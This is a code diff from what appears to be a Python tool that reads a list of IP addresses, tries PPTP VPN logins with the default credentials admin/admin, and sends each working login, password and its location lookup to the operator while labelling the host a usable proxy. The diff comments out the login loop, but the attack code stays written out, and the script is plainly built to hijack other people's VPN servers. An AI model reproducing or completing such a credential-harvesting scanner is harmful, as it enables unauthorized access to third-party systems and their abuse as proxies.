@@ -59,17 +59,18 @@ def process_pptp_file(filename):
 
     pptps = open(filename).read().split("\n")
     for ips in list(pptps):
-        try:
-            iss = pptp(ips, "admin", "admin")
-            text = f"{iss[0]} - pptp\nLogPass={iss[1]}:{iss[2]}\nState:{ipif(iss[0])[0]}/{ipif(iss[0])[2]}"
-            send(text)
-            print(f"proxy: {ips} - is work")
-            pskl()
-        except:
-            add_checked(ips)
-            pskl()
-            print(f"proxy: {ips} - isn't work")
-            continue
+        print(ips)
+        # try:
+        #     iss = pptp(ips, "admin", "admin")
+        #     text = f"{iss[0]} - pptp\nLogPass={iss[1]}:{iss[2]}\nState:{ipif(iss[0])[0]}/{ipif(iss[0])[2]}"
+        #     send(text)
+        #     print(f"proxy: {ips} - is work")
+        #     pskl()
+        # except:
+        #     add_checked(ips)
+        #     pskl()
+        #     print(f"proxy: {ips} - isn't work")
+        #     continue
 
 
 def is_port_open(ip, port=1723, timeout=3):
